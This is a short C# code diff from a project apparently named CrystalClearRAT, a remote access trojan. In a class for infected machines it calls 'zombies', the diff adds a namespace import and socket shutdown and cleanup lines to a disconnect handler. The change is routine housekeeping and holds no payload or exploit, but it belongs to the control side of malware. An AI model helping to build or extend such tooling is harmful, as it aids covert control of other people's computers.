@@ -1,4 +1,5 @@
-﻿using System;
+﻿using CrystalClearRAT.Web;
+using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.ComponentModel;
@@ -45,6 +46,9 @@ namespace CrystalClearRAT.ZombieModel
 
             App.Current.Dispatcher.Invoke(() =>
             {
+                Socket.Shutdown(SocketShutdown.Both);
+                Socket.Close();
+                Server.ClearRequests();
                 Zombies.Remove(this);
             });
 
